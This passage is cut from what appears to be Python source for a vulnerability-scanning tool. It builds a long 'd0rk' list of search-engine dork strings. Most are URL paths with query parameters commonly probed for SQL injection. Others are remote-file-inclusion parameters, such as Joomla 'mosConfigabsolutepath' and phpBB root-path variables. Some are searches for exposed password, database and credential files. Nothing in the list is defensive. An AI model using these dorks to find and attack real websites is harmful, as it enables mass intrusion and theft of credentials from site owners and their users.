         'articles.cgi?a34&t', 'articles.php?id', 'articles/article.php?id', 'articles/details.php?id',
         'articles/index.php?id', 'artikelinfo.php?id', 'artist.php?id', 'artistart.asp?id', 'artistart.php?id',
         'artistdetail.php?ID', 'artistinfo.php?artistId', 'artists.php?id', 'artists/details.php?id',
         'artists/index.php?id', 'artists/story/index.php?id', 'artpage.php?id', 'ashellcommandprompt;usernamesare',
         'asp', 'asp/event.asp?id', 'asp/fid8E1BED06B1301BAE3ED64383D5F619E3B1997A70.aspx?s',
         'asp/fid985C124FBD9EF3A29BA8F40521F12D097B0E2016.aspx?s', 'asp/index.asp?id', 'aspx?PageID',
         'asterisk.management.portalwebaccess', 'atom.php5?pagephp5?id', 'auction/item.asp?id', 'auction/item.php?id',
         'auctiondetails.php?auctionid', 'auctionweaver.pl', 'auktion.pl?menue', 'authorDetails.asp?bookID',
         'authorDetails.php?bookID', 'authors.pwd', 'authuserfile.txt', 'auto.php?incphp?inc',
         'auto.php?pageauto.php?page', 'avatar.php?page', 'avdstart.php?avd', 'awards/index.php?input1', 'axiscgi/jpg',
         'axiscgi/mjpgmotionJPEG', 'axisvideoserver',
         'b2evo>LoginformLoginform.Youmustlogin!Youwillhavetoacceptcookiesinordertologindemositeb2evolution.net',
         'backupfiletypemdb', 'bandinfo.php?id', 'base.php?', 'base.php?[]', 'base.php?abre', 'base.php?adresa',
         'base.php?basedir', 'base.php?basepath', 'base.php?body', 'base.php?category', 'base.php?chapter',
         'base.php?choix', 'base.php?cont', 'base.php?disp', 'base.php?doshow', 'base.php?ev', 'base.php?eval',
         'base.php?f1base.php?f1', 'base.php?f1php?f1', 'base.php?filepath', 'base.php?home', 'base.php?id',
         'base.php?incl', 'base.php?include', 'base.php?ir', 'base.php?itemnav', 'base.php?k', 'base.php?ki',
         'base.php?l', 'base.php?lang', 'base.php?link', 'base.php?loc', 'base.php?mid', 'base.php?middle',
         'base.php?middlePart', 'base.php?module', 'base.php?name', 'base.php?numero', 'base.php?oldal',
         'base.php?opcion', 'base.php?pa', 'base.php?pag', 'base.php?pageweb', 'base.php?panel', 'base.php?path',
         'base.php?phpbbrootpath', 'base.php?play', 'base.php?pname', 'base.php?rub', 'base.php?seccion',
         'base.php?second', 'base.php?seite', 'base.php?sekce', 'base.php?sivu', 'base.php?str', 'base.php?subject',
         'base.php?t', 'base.php?texto', 'base.php?to', 'base.php?v', 'base.php?var', 'base.php?w', 'basket.asp?id',
         'basket.cfm?id', 'basket.php?id', 'bayer/dtnews.asp?id', 'bayer/dtnews.php?id', 'bbs/bbsView.asp?id',
         'bbs/bbsView.php?id', 'bbs/view.asp?no', 'bbs/view.php?no', 'bbs/view.php?tbl', 'bbsforum.cgi',
         'bbusagestats/include/bbusagestats.php?phpbbrootpath',
         'bbusagestats/include/bbusagestats.php?phpbbrootpathforum', 'bearstore/store.php?catid',
         'becommunity/community/index.php?pageurl', 'beitragD.asp?id', 'beitragD.php?id', 'beitragF.asp?id',
         'beitragF.php?id', 'bid/topic.asp?TopicID', 'bid/topic.php?TopicID', 'big.php?pathtotemplate',
         'bin.welcome.sh|bin.welcome.bat|eHealth.5.0', 'biznews.cgi?a33&t', 'blank.php?OpenPage', 'blank.php?abre',
         'blank.php?action', 'blank.php?basedir', 'blank.php?basepath', 'blank.php?body', 'blank.php?category',
         'blank.php?channel', 'blank.php?corpo', 'blank.php?destino', 'blank.php?dir', 'blank.php?filepath',
         'blank.php?get', 'blank.php?goFile', 'blank.php?goto', 'blank.php?h', 'blank.php?header', 'blank.php?id',
         'blank.php?in', 'blank.php?incl', 'blank.php?ir', 'blank.php?itemnav', 'blank.php?j', 'blank.php?ki',
         'blank.php?lang', 'blank.php?left', 'blank.php?link', 'blank.php?loader', 'blank.php?menu', 'blank.php?mod',
         'blank.php?name', 'blank.php?o', 'blank.php?oldal', 'blank.php?open', 'blank.php?pa', 'blank.php?page',
         'blank.php?pagina', 'blank.php?panel', 'blank.php?path', 'blank.php?phpbbrootpath', 'blank.php?pname',
         'blank.php?pollname', 'blank.php?pr', 'blank.php?pre', 'blank.php?pref', 'blank.php?qry', 'blank.php?read',
         'blank.php?ref', 'blank.php?rub', 'blank.php?section', 'blank.php?sivu', 'blank.php?sp', 'blank.php?strona',
         'blank.php?subject', 'blank.php?t', 'blank.php?url', 'blank.php?var', 'blank.php?where', 'blank.php?xlink',
         'blank.php?z', 'blog.asp?blog', 'blog.php?blog', 'blog/?p', 'blog/index.asp?idBlog', 'blog/index.php?idBlog',
         'blogdetail.asp?id', 'blogdetail.php?id', 'blpage.php?id', 'bnbform.cgi', 'board',
         'board.php?seeboard.php?see', 'board.php?seephp?see', 'board/board.html?table', 'board/kboard.php?board']
d0rk += ['board/read.asp?tid', 'board/read.php?tid', 'board/showthread.asp?t', 'board/showthread.php?t',
         'board/templete/sycho/input.php?table', 'board/view.asp?no', 'board/view.php?no', 'board/viewtemp.php?table',
         'board/viewtopic.php?id', 'boardView.asp?bbs', 'boardView.php?bbs', 'boardview.asp?sboardid',
         'boardview.html?id', 'boardview.php?sboardid', 'boatplans.asp?id', 'book.asp?ID', 'book.asp?ISBN',
         'book.html?isbn', 'book.php5?pagephp5?page', 'book.php?ID', 'book.php?ISBN', 'book/bookcover.asp?bookid',
         'book/bookcover.php?bookid', 'book2.php?id', 'bookSingle.php?bookId', 'bookdetail.asp?BookID',
         'bookdetail.php?BookID', 'bookdete.php?bookID', 'booking.php?id', 'booking.php?s', 'booking/bandinfo.php?id',
         'booklist.asp?bookid', 'booklist.cfm?bookid', 'booklist.php?bookid', 'bookmark.htm',
         'bookmark/mybook/bookmark.asp?bookPageNo', 'bookmark/mybook/bookmark.php?bookPageNo', 'bookpage.asp?id',
         'bookpage.php?id', 'books', 'books.asp?id', 'books.php?id', 'books/book.asp?projnr', 'books/book.php?projnr',
         'bookview.asp?bookid', 'bookview.asp?id', 'bookview.cfm?bookid', 'bookview.php?bookid', 'bookview.php?id',
         'bpac/calendar/event.asp?id', 'bpac/calendar/event.php?id', 'bpblogadminlogin|adminsitejohnny.ihackstuff.com',
         'bpncom.php?bnrep', 'brand.asp?id', 'brand.php?id', 'brief.php?id', 'browse.asp?catid', 'browse.cfm?catid',
         'browse.php?catid', 'browse.php?cid', 'browse/book.asp?journalID', 'browse/book.php?journalID',
         'browseitemdetails.asp', 'browseitemdetails.cfm', 'browseitemdetails.php', 'browsepr.asp?pr',
         'browsepr.php?pr', 'browser.inc', 'buddylist.blt', 'bug.php?id', 'build.cgi', 'build.err',
         'business/details.php?id', 'buy', 'buy.asp?', 'buy.asp?bookid', 'buy.cfm?', 'buy.cfm?bookid', 'buy.php?',
         'buy.php?bookid', 'buy.php?category', 'byReimarHoven.AllRightsReserved.Disclaimer|log/logdb.dta',
         'bycategory.asp?id', 'bycategory.cfm?id', 'bycategory.php?id', 'cachedfeed.cgi', 'cachemgr.cgi',
         'cactigraphview.phpSettingsTreeViewcvsRPM', 'calendar.asp?actionlogin', 'calendar.php?eventid',
         'calendar.pl?commandlogin&fromTemplate',
         'calendar.pl?commandlogin&fromTemplateencore/forumcgi/display.cgi?preftemptemp&pageanonymous&file',
         'calendar/event.asp?id', 'calendar/event.php?id', 'calendar/item.php?id', 'calendar/week.php?cid',
         'calendars?ri?t/users.txt', 'cambiaremicrosoftconilsitochevolete...ad.es.adobe', 'cameralinksysmain.cgi',
         'campaigns.php?id', 'campas', 'campdetails.php?id', 'campkctoday.php?Start', 'campkcviewevent.php?ItemID',
         'canal.php?meiophp?meio', 'canal/imap.php?id', 'car.php?id', 'cardIssuance/product.php?pid',
         'cardetail.php?id', 'cardetails.php?id', 'cardinfo.asp?card', 'cardinfo.cfm?card', 'cardinfo.php?card',
         'carinfo.php?id', 'carrydetail.php?prodID', 'carsdetail.php?id', 'cart.asp?action', 'cart.asp?cartid',
         'cart.asp?id', 'cart.cfm?action', 'cart.cfm?cartid', 'cart.cfm?id', 'cart.php?action', 'cart.php?cartid',
         'cart.php?id', 'cart/addToCart.asp?cid', 'cart/addToCart.php?cid', 'cart/detailprod.php?id',
         'cart/home.php?cat', 'cart/itemshow.php?itemID', 'cart/proddetails.php?prodid', 'cart/prodsubcat.php?id',
         'cart/product.asp?productid', 'cart/product.php?productid', 'cart32.exe', 'cartadd.asp?id', 'cartadd.cfm?id',
         'cartadd.php?id', 'cartadditem.asp?id', 'cartadditem.cfm?id', 'cartadditem.php?id', 'cartvalidate.asp?id',
         'cartvalidate.cfm?id', 'cartvalidate.php?id', 'cat', 'cat.asp?catid', 'cat.asp?iCat', 'cat.asp?id',
         'cat.cfm?iCat', 'cat.php?cat', 'cat.php?catid', 'cat.php?iCat', 'cat/?catid', 'catalog.asp',
         'catalog.asp?CatalogID', 'catalog.cfm', 'catalog.cfm?CatalogID', 'catalog.php', 'catalog.php?CAT',
         'catalog.php?CatalogID', 'catalog/index.php?cPath', 'catalog/main.asp?catid', 'catalog/main.php?catid',
         'catalog/product.asp?catid', 'catalog/product.asp?pid', 'catalog/product.php?catid', 'catalog/product.php?pid',
         'catalog/productinfo.php?productsid', 'catalogitem.asp?ID', 'catalogitem.cfm?ID', 'catalogitem.php?ID',
         'catalogmain.asp?catid', 'catalogmain.cfm?catid', 'catalogmain.php?catid', 'categories.asp?cat',
         'categories.php?cat', 'categories.php?catid', 'categories.php?id', 'categories.php?parentid',
         'categories.php?start', 'category.asp', 'category.asp?CID', 'category.asp?c', 'category.asp?catid',
         'category.asp?id', 'category.asp?idcategory', 'category.cfm', 'category.cfm?catid', 'category.php',
         'category.php?CID', 'category.php?c', 'category.php?categoryid', 'category.php?catid', 'category.php?id',
         'category.php?idcategory', 'category/indexpages.php?categoryid', 'categorydisplay.asp?catid',
         'categorydisplay.cfm?catid', 'categorydisplay.php?catid', 'categoryid.php?id', 'categorylist.asp?id',
         'categorylist.cfm?id', 'categorylist.php?id', 'categoryview.php?categoryid', 'cats.asp?cat', 'cats.php?cat',
         'catsdisp.php?cat', 'cbmer/congres/page.asp?LAN', 'cbmer/congres/page.php?LAN', 'cc/showthread.php?p',
         'cc/showthread.php?t', 'ccbill/whereami.cgi?gls', 'ccbillfiletypelog', 'cd.php?id',
         'cei/cedb/projdetail.asp?projID', 'cei/cedb/projdetail.php?projID', 'cemetery.asp?id', 'cemetery.php?id',
         'cfm', 'cfmx?PageID', 'cgi', 'cgibin/1/cmd.cgi', 'cgibin/acart/acart.pl?&page',
         'cgibin/awstats.pl?update1&logfile']
d0rk += ['cgibin/awstats/awstats.pl?configdir', 'cgibin/bbs/read.cgi?file', 'cgibin/bp/bplib.pl?g', 'cgibin/hinsts.pl?',
         'cgibin/hinsts.pl?cgibin/bp/bplib.pl?gccbill/whereami.cgi?gls', 'cgibin/ikonboard.cgi',
         'cgibin/index.cgi?page', 'cgibin/jammail.pl?jobshowoldmail&mail', 'cgibin/printenv', 'cgibin/probe.cgi?olddat',
         'cgibin/quikstore.cgi?category', 'cgibin/telnet.cgi', 'cgibin/telnet.cgicgibin/1/cmd.cgi',
         'cgibin/testcgi.exePleasedistributeTestCGI', 'cgibin/ubb/ubb.cgi?g', 'cgibin/ultimatebb.cgi?ubblogin',
         'cgibincalendar.cfg', 'cgiirc.conf', 'cgiirc.config', 'cgisys/guestbook.cgi?usercpanel&template', 'cgiwrap',
         'chalets.php?id', 'chamber/members.php?id', 'changepassword.asp', 'channel/channellayout.asp?objId',
         'channel/channellayout.php?objId', 'channelid', 'chappies.php?id', 'chapsecretscvs', 'cheats/details.php?ID',
         'cheats/item.php?itemid', 'checknews.php?id', 'checkout.asp?UserID', 'checkout.asp?cartid',
         'checkout.cfm?UserID', 'checkout.cfm?cartid', 'checkout.php?UserID', 'checkout.php?cartid',
         'checkout1.asp?cartid', 'checkout1.cfm?cartid', 'checkout1.php?cartid', 'checkoutconfirmed.asp?orderid',
         'checkoutconfirmed.cfm?orderid', 'checkoutconfirmed.php?orderid', 'clanek.php4?id', 'clanpage.asp?cid',
         'clanpage.php?cid', 'classes/adodbt/sql.php?classesdir', 'classified/detail.php?siteid', 'classifieds.cgi',
         'classifieds/detail.asp?siteid', 'classifieds/detail.php?siteid', 'classifieds/showproduct.asp?product',
         'classifieds/showproduct.php?product', 'clear/store/products.php?productcategory', 'clientid',
         'cloudbank/detail.asp?ID', 'cloudbank/detail.php?ID', 'club.asp?cid', 'club.php?cid', 'clubpage.php?id',
         'cm/public/news/news.php?newsid', 'cmd', 'cmd.php?argphp?arg', 'cms/publications.php?id',
         'cms/showpage.php?cid', 'cms/story.php?id', 'collectionitem.php?id',
         'colourpointeducational/moredetails.asp?id', 'colourpointeducational/moredetails.php?id', 'comedytogo.php?id',
         'comersuslistCategoriesAndProducts.asp?idCategory', 'comersuslistCategoriesAndProducts.cfm?idCategory',
         'comersuslistCategoriesAndProducts.php?idCategory', 'comersusmessage.asp',
         'comersusoptEmailToFriendForm.asp?idProduct', 'comersusoptEmailToFriendForm.cfm?idProduct',
         'comersusoptEmailToFriendForm.php?idProduct', 'comersusoptReviewReadExec.asp?idProduct',
         'comersusoptReviewReadExec.cfm?idProduct', 'comersusoptReviewReadExec.php?idProduct',
         'comersusviewItem.asp?idProduct', 'comersusviewItem.cfm?idProduct', 'comersusviewItem.php?idProduct',
         'comextendedregistration', 'comments.asp?id', 'comments.php?id', 'commentsform.asp?ID', 'commentsform.cfm?ID',
         'commentsform.php?ID', 'common.php', 'communigateproentrance', 'communiquedetail.php?id',
         'community/calendareventfr.asp?id', 'community/calendareventfr.php?id', 'company.asp?ID',
         'company/news.php?id', 'companydetails.php?ID',
         'components/comartlinks/artlinks.dispnew.php?mosConfigabsolutepath',
         'components/comcpg/cpg.php?mosConfigabsolutepath',
         'components/comextcalendar/adminevents.php?CONFIGEXT[LANGUAGESDIR]',
         'components/comextendedregistration/registrationdetailed.inc.php?mosConfigabsolutepath',
         'components/comextendedregistration/registrationdetailed.inc.php?mosConfigabsolutepathcomextendedregistration',
         'components/comforum/download.php?phpbbrootpath', 'components/comforum/download.php?phpbbrootpathcomforum',
         'components/comgalleria/galleria.html.php?mosConfigabsolutepath',
         'components/comgeria/geria.html.php?mosConfigabsolutepath',
         'components/commtree/Savant2/Savant2Pluginstylesheet.php?mosConfigabsolutepath',
         'components/comperforms/performs.php?mosConfigabsolutepath',
         'components/comperforms/performs.php?mosConfigabsolutepathcomperforms',
         'components/comphpshop/toolbar.phpshop.html.php?mosConfigabsolutepath',
         'components/comphpshop/toolbar.phpshop.html.php?mosConfigabsolutepathcomphpshop',
         'components/comrsgallery/rsgallery.html.php?mosConfigabsolutepath',
         'components/comrsgery/rsgery.html.php?mosConfigabsolutepath',
         'components/comrsgery/rsgery.html.php?mosConfigabsolutepathcomrsgery',
         'components/comrsgery/rsgery.html.php?mosConfigabsolutepathrsgery',
         'components/comrsgery/rsgery.html.php?mosConfigabsolutepathrsgery.php',
         'components/comsimpleboard/imageupload.php?sbp', 'components/comsimpleboard/imageupload.php?sbpcomsimpleboard',
         'confidentialsitemil', 'config.php', 'config.php?CCFG[PKGPATHDBSE]', 'config.phpdbunamedbpass',
         'confixxlogin|anmeldung', 'conproduct.php?prodid', 'constructies/product.asp?id',
         'constructies/product.php?id', 'cont', 'contact.asp?cartId', 'contact.cfm?cartId', 'contact.php?cartId',
         'contact.php?id', 'contactdetails.php?id', 'contacts.php?caldir', 'contactsextwml', 'contactus?reportCompany',
         'contenido.php?sec', 'content.asp?PID', 'content.asp?artiid', 'content.asp?cID', 'content.asp?categoryId',
         'content.asp?conttitle', 'content.asp?id', 'content.asp?p', 'content.cfm?id', 'content.php?PID',
         'content.php?artiid', 'content.php?cID', 'content.php?categoryId', 'content.php?conttitle', 'content.php?dtid',
         'content.php?id', 'content.php?incphp?inc', 'content.php?nID', 'content.php?op', 'content.php?p',
         'content.php?page', 'content.php?pagecontent.php?pagephp']
d0rk += ['content.php?seitecontent.php?seite', 'content.php?seitephp?seite', 'content/conferenceregister.asp?ID',
         'content/conferenceregister.php?ID', 'content/detail.asp?id', 'content/detail.php?id', 'content/index.asp?id',
         'content/index.php?id', 'content/pages/index.asp?idcat', 'content/pages/index.php?idcat',
         'content/programme.asp?ID', 'content/programme.php?ID', 'content/view.asp?id', 'content/view.php?id',
         'contentok.php?id', 'convertdate.php?caldir', 'coppercop/theme.php?THEMEDIR',
         'coranto.cgiLoginAuthorizedUsersOnly', 'corporate/faqs/faq.php?Id', 'corporate/newsreleasesmore.asp?id',
         'corporate/newsreleasesmore.php?id', 'counter.exe', 'countyfacts/diary/vcsgen.asp?id',
         'countyfacts/diary/vcsgen.php?id', 'courses/course.php?id', 'courses/coursedetails.php?id', 'cpage.php?id',
         'cps/rde/xchg/tm/hs.xsl/liensdetail.html?lnkId', 'credentials', 'cryolab/content.asp?cid',
         'cryolab/content.php?cid', 'csCreatePro.cgi', 'csc/newsdetails.asp?cat', 'csc/newsdetails.php?cat',
         'csvdb/csvdb.cgi?filefile.extention', 'ctlBasicshowsWebusercredentials', 'cube/index.php?catid',
         'cubecart/index.php?catid', 'cuisine/index.php?id', 'current/diary/story.php?id', 'currentframe',
         'curriculum.php?id', 'curriculumvitaefiletypedoc', 'customer/board.htm?mode', 'customer/home.asp?cat',
         'customer/home.php?cat', 'customer/product.php?productid', 'customerService.asp?ID1',
         'customerService.asp?TextID1', 'customerService.cfm?ID1', 'customerService.php?ID1', 'custompages.php?id',
         'cvsweb.cgi', 'cyberfolio/portfolio/msg/view.php?avcyberfolio', 'data', 'dataaccess/article.php?ID',
         'datafiletypemdbsitegovsitemil', 'date', 'db.cgi', 'db.php?pathlocal', 'db/CART/productdetails.asp?productid',
         'db/CART/productdetails.php?productid', 'db/item.html?item', 'dbase.php?actiondbase.php',
         'dbase.php?actiondbase.php?action', 'dbase.php?actionphp?action', 'dbconnect.inc', 'dbfiletypemdb',
         'ddoecom/index.php?id', 'ddoecom/product.php?proid', 'de/content.asp?pageid', 'de/content.php?pageid',
         'dealcoupon.asp?catid', 'dealcoupon.php?catid', 'debatedetail.asp?id', 'debatedetail.php?id',
         'declarationmore.php?declid', 'default.asp', 'default.asp?TID', 'default.asp?cPath', 'default.asp?catID',
         'default.aspWebCommander', 'default.asp', 'default.cfm?catID', 'default.php?TID', 'default.php?abre',
         'default.php?arquivophp?arquivo', 'default.php?basedir', 'default.php?basepath', 'default.php?body',
         'default.php?cPath', 'default.php?catID', 'default.php?channel', 'default.php?chapter', 'default.php?choix',
         'default.php?cmd', 'default.php?cont', 'default.php?destino', 'default.php?e', 'default.php?eval',
         'default.php?f', 'default.php?goto', 'default.php?header', 'default.php?id', 'default.php?inc',
         'default.php?incl', 'default.php?include', 'default.php?index', 'default.php?ir', 'default.php?itemnav',
         'default.php?k', 'default.php?ki', 'default.php?l', 'default.php?left', 'default.php?load',
         'default.php?loader', 'default.php?loc', 'default.php?m', 'default.php?menu', 'default.php?menue',
         'default.php?mid', 'default.php?mod', 'default.php?module', 'default.php?n', 'default.php?name',
         'default.php?nivel', 'default.php?oldal', 'default.php?opcion', 'default.php?option', 'default.php?p',
         'default.php?pa', 'default.php?pag', 'default.php?page', 'default.php?page/default.php?pagephp',
         'default.php?pageweb', 'default.php?panel', 'default.php?param', 'default.php?play', 'default.php?pr',
         'default.php?pre', 'default.php?read', 'default.php?ref', 'default.php?root', 'default.php?rub',
         'default.php?secao', 'default.php?secc', 'default.php?seccion', 'default.php?seite', 'default.php?showpage',
         'default.php?sivu', 'default.php?sp', 'default.php?str', 'default.php?strona', 'default.php?t',
         'default.php?thispage', 'default.php?tipo', 'default.php?to', 'default.php?type', 'default.php?v',
         'default.php?var', 'default.php?visphp?vis', 'default.php?x', 'default.php?y', 'default/login.phpkerio',
         'default/theme.php?THEMEDIR', 'define.php?termphp?term', 'demositeoscommerce.com', 'deportes.cgi?alatest&t',
         'description.asp?bookid', 'description.cfm?bookid', 'description.php?bookid', 'designcenter/item.php?id',
         'detail', 'detail.asp?id', 'detail.asp?prodid', 'detail.asp?siteid', 'detail.php?ID', 'detail.php?catid',
         'detail.php?itemid', 'detail.php?proddetail.php?prod', 'detail.php?prodid', 'detail.php?prodphp?prod',
         'detail.php?siteid', 'detailedbook.asp?isbn', 'detailedbook.php?isbn', 'detailedproduct.asp?id',
         'details.asp?BookID', 'details.asp?PressReleaseID', 'details.asp?ProductID', 'details.asp?ServiceID',
         'details.asp?id', 'details.asp?prodId', 'details.cfm?BookID', 'details.cfm?PressReleaseID',
         'details.cfm?ProductID', 'details.cfm?ServiceID', 'details.php?BookID', 'details.php?PressReleaseID',
         'details.php?ProductID', 'details.php?ServiceID', 'details.php?id', 'details.php?locdetails.php?loc',
         'details.php?locphp?loc', 'details.php?page', 'details.php?prodId', 'details/food.php?cid',
         'detectedaninternalerror[IBM][CLIDriver][DB2/6000]', 'developmentsdetail.php?id', 'developmentsview.php?id',
         'digantidengan', 'dir', 'direct.php?locdirect.php?loc', 'directions.php?locdirections.php?loc']
d0rk += ['directory.php?cat', 'directory/contenu.asp?idcat', 'directory/contenu.php?idcat',
         'directory/listingcoupons.php?id', 'directory/profile.php?id', 'directory/showcat.php?cat',
         'directorylisting.php?cat', 'discontproductpg.php?productid', 'discussions/10/9/?CategoryID',
         'discussions/9/6/?CategoryID', 'display', 'display.asp?ID', 'display.php?ID', 'display.php?fdisplay.php?f',
         'display.php?filedisplay.php?file', 'display.php?langdisplay.php?lang', 'display.php?ldisplay.php?l',
         'display.php?lndisplay.php?ln', 'display.php?pagdisplay.php?pag', 'display.php?page&langdisplay.php?page',
         'display.php?page&langphp?page', 'display.php?pagedisplay.php?page', 'display.php?pagephp?page',
         'display.php?pdisplay.php?p', 'display.php?pgdisplay.php?pg', 'display.php?sdisplay.php?s',
         'display.php?tabledisplay.php?table', 'display.php?tablephp?table', 'displayArticle.php?id',
         'displayArticleB.asp?id', 'displayArticleB.php?id', 'displayCategory.php?basepath', 'displayitem.asp?id',
         'displayitem.cfm?id', 'displayitem.php?id', 'displaypage.asp?id', 'displaypage.php?elementId',
         'displaypage.php?id', 'displaypage.php?tpl', 'displayproduct.php?Product', 'displayproducts.asp',
         'displayproducts.cfm', 'displayproducts.php', 'displayrange.asp?rangeid', 'displayrange.php?rangeid',
         'displaysunsign.php?id', 'displayuser.php?ID', 'docDetail.aspx?chnum', 'docushare/dsweb/faqgovedu',
         'dotproject/modules/files/indextable.php?rootdir', 'dotproject/modules/projects/addedit.php?rootdir',
         'dotproject/modules/projects/view.php?rootdir', 'dotproject/modules/projects/vwfiles.php?rootdir',
         'dotproject/modules/tasks/addedit.php?rootdir', 'dotproject/modules/tasks/viewgantt.php?rootdir',
         'down.php?OpenPage', 'down.php?action', 'down.php?addr', 'down.php?channel', 'down.php?choix', 'down.php?cmd',
         'down.php?corpo', 'down.php?disp', 'down.php?doshow', 'down.php?ev', 'down.php?filepath', 'down.php?goFile',
         'down.php?home', 'down.php?in', 'down.php?inc', 'down.php?incl', 'down.php?include', 'down.php?ir',
         'down.php?lang', 'down.php?left', 'down.php?nivel', 'down.php?oldal', 'down.php?open', 'down.php?pa',
         'down.php?pag', 'down.php?pageweb', 'down.php?param', 'down.php?path', 'down.php?pg', 'down.php?phpbbrootpath',
         'down.php?pollname', 'down.php?pr', 'down.php?pre', 'down.php?qry', 'down.php?r', 'down.php?read',
         'down.php?s', 'down.php?second', 'down.php?section', 'down.php?seite', 'down.php?showpage', 'down.php?sp',
         'down.php?strona', 'down.php?subject', 'down.php?t', 'down.php?texto', 'down.php?to', 'down.php?u',
         'down.php?url', 'down.php?v', 'down.php?where', 'down.php?x', 'down.php?z', 'download', 'download.asp?id',
         'download.php?id', 'download.php?subdownload.php?sub', 'downloadTrial.asp?intProdID',
         'downloadTrial.cfm?intProdID', 'downloadTrial.php?intProdID', 'downloaddetails.php?id', 'downloadfree.php?id',
         'downloads.asp?id', 'downloads.asp?software', 'downloads.php?fileid', 'downloads.php?id', 'downloads.php?type',
         'downloads/category.asp?c', 'downloads/category.php?c', 'downloads/shambler.asp?id',
         'downloads/shambler.php?id', 'downloadsinfo.php?id', 'dreaminterpretation.php?id', 'ds.py',
         'duclassmatesiteduware.com', 'dudownloadsiteduware.com', 'dump.php?bdid', 'dumpenv.pl',
         'dupicsadd.asp|default.asp|view.asp|voting.aspsite',
         'dupicsadd.asp|default.asp|view.asp|voting.aspsiteduware.com', 'duware.com', 'dvwssr.dll',
         'e107/e107handlers/secureimgrender.php?p', 'eMuleWebControlPanelintextWebControlPanelEnteryourpasswordhere.',
         'ePowerSwitchLogin', 'eXistDatabaseAdministrationdemo', 'earth/visitwcmview.php?id', 'earthactivity.cfm?id',
         'eboard/modifyform.html?code', 'edatabase/home.asp?cat', 'edatabase/home.php?cat', 'edit.pl',
         'editProduct.php?cid', 'edition.asp?areaid', 'edition.php?areaid', 'editor.php?root',
         'editor/list.asp|databaseeditor.asp|login.asaareset', 'ednastreamingmp3serverforums', 'education.php?idcat',
         'education/content.asp?page', 'education/content.php?page', 'eggdropfiletypeuseruser',
         'els/product/product.asp?id', 'els/product/product.php?id', 'emailToFriend.asp?idProduct',
         'emailToFriend.cfm?idProduct', 'emailToFriend.php?idProduct', 'emailaddressfiletypecsvcsv', 'emailfiletypemdb',
         'emailproduct.asp?itemid', 'emailproduct.cfm?itemid', 'emailproduct.php?itemid', 'emsgb/easymsgb.pl?print',
         'en/details.php?id', 'en/main.asp?id', 'en/main.php?id', 'en/mobilephone.php?ProdID',
         'en/news/fullnews.asp?newsid', 'en/news/fullnews.php?newsid', 'en/procurement/newsitem.php?newsID',
         'en/product.php?proid', 'en/produit.php?id', 'en/publications.asp?id', 'en/publications.php?id',
         'en/visit.php?id', 'enablepassword|secretcurrentconfigurationintextthe', 'enc/content.php?HomePath',
         'enc/content.php?HomePathdoodle', 'enc/content.php?HomePathdoodlecart',
         'enc/content.php?HomePathpoweredbydoodlecart', 'encapscmsPATH/core/core.php?rootencapscmsPATH',
         'encore/forumcgi/display.cgi?preftemptemp&pageanonymous&file', 'endymion.sak?.mail.login.page|sake.servlet',
         'eng.php?imgeng.php?img', 'eng.php?imgphp?img', 'eng/board/view.php?id', 'eng/rgboard/view.asp?&bbsid',
         'eng/rgboard/view.php?&bbsid', 'eng/store/showscat.php?catid', 'engboard/view.asp?T', 'engboard/view.php?T']
d0rk += ['english/board/view.asp?code', 'english/board/view.php?code', 'english/fonction/print.asp?id',
         'english/fonction/print.php?id', 'english/gallery.php?id', 'english/index.php?id', 'english/print.asp?id',
         'english/print.php?id', 'english/publicproducts.asp?groupid', 'english/publicproducts.php?groupid',
         'enter.php?a', 'enter.php?abre', 'enter.php?addr', 'enter.php?b', 'enter.php?basedir', 'enter.php?body',
         'enter.php?chapter', 'enter.php?cmd', 'enter.php?content', 'enter.php?e', 'enter.php?ev', 'enter.php?get',
         'enter.php?go', 'enter.php?goto', 'enter.php?home', 'enter.php?id', 'enter.php?incl', 'enter.php?include',
         'enter.php?index', 'enter.php?ir', 'enter.php?itemnav', 'enter.php?lang', 'enter.php?left', 'enter.php?link',
         'enter.php?loader', 'enter.php?menue', 'enter.php?mid', 'enter.php?middle', 'enter.php?mod',
         'enter.php?module', 'enter.php?name', 'enter.php?numero', 'enter.php?open', 'enter.php?pa', 'enter.php?page',
         'enter.php?pagina', 'enter.php?panel', 'enter.php?path', 'enter.php?pg', 'enter.php?phpbbrootpath',
         'enter.php?play', 'enter.php?pname', 'enter.php?pr', 'enter.php?pref', 'enter.php?qry', 'enter.php?r',
         'enter.php?read', 'enter.php?ref', 'enter.php?s', 'enter.php?sec', 'enter.php?second', 'enter.php?seite',
         'enter.php?sivu', 'enter.php?sp', 'enter.php?start', 'enter.php?str', 'enter.php?strona', 'enter.php?subject',
         'enter.php?texto', 'enter.php?thispage', 'enter.php?type', 'enter.php?viewpage', 'enter.php?w', 'enter.php?y',
         'entertainment/listings.php?id', 'episode.php?id', 'errorfoundhandlingtherequestcocoonfiletypexml',
         'errorhasoccurredfiletypeihtml', 'eshop.php?id', 'estore/products.php?cat', 'etcindex.of', 'etemplate.php?id',
         'event.asp?id', 'event.php?contentID', 'event.php?id', 'event/detail.php?id', 'eventdetails.asp?id',
         'eventdetails.php?id', 'eventinfo.asp?p', 'eventinfo.php?p', 'eventlistingsshort.php?s', 'events.asp?ID',
         'events.cfm?ID', 'events.cgi?a155&t', 'events.cgi?t', 'events.php?ID', 'events.php?pid',
         'events/detail.asp?ID', 'events/detail.php?ID', 'events/details.php?id', 'events/event.asp?id',
         'events/event.php?id', 'events/eventdetail.asp?id', 'events/eventdetail.cfm?intNewsEventsID',
         'events/eventdetail.php?id', 'events/events.php?id', 'events/index.asp?id', 'events/index.php?id',
         'events/uniqueevent.asp?ID', 'events/uniqueevent.php?ID', 'events?id', 'eventsdetail.php?pid',
         'eventsdetails.php?id', 'eventsmore.php?id', 'eventtype.php?id', 'exchweb/bin/auth/owalogon.asp',
         'exclusive.php?pID', 'exhibitionoverview.asp?id', 'exhibitionoverview.php?id', 'exhibitions/detail.asp?id',
         'exhibitions/detail.php?id', 'exhibitions/details.php?id', 'exibir.php?abre', 'exibir.php?get',
         'exibir.php?lang', 'exibir.php?p', 'exibir.php?page', 'expanded.php?conf', 'experts.php?subexperts.php?sub',
         'exportedemailaddresses', 'extCDXCDX', 'extasa|extbakintextuidintextpwduid..pwddatabase|server|dsn',
         'extaspinurlathto.asp', 'extasppathto.asp', 'extccmccmcatacomb', 'extcfgradius.cfg',
         'extcgicontrolpanelenteryourownerpasswordtocontinue!', 'extcgieditcgi.cgifile',
         'extcgiintextnrgThiswebpagewascreatedon', 'extconfNoCatAuthcvs', 'extconfrsyncd.confcvsman',
         'extconfrsyncd.confcvsmanextconfNoCatAuthcvs', 'extdatbpk.dat',
